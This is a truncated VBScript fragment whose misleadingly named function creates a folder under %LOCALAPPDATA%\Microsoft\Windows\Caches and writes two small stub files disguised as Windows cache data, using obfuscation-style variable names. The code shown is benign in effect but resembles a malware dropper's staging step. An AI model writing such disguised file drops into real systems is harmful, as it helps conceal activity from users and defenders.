Function DecodeManifest57()
' --- helpers ---
Dim fs4048,sh4048,cache4048,tx4048,xml4048
Set fs4048=CreateObject("Scripting.FileSystemObject")
Set sh4048=CreateObject("WScript.Shell")
cache4048=sh4048.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\Caches"
If Not fs4048.FolderExists(cache4048) Then fs4048.CreateFolder cache4048
Set tx4048=fs4048.CreateTextFile(cache4048 & "\profile_delta.bin",True)
tx4048.Write "WU"
tx4048.Close
Set xml4048=fs4048.CreateTextFile(cache4048 & "\catalog_stub.xml",True)
xml4048.Write "<?xml version=""1.0""?><catalog/>"
xml4048.Close
DecodeManifest57=0
End Function

Function GetManifestPart71()
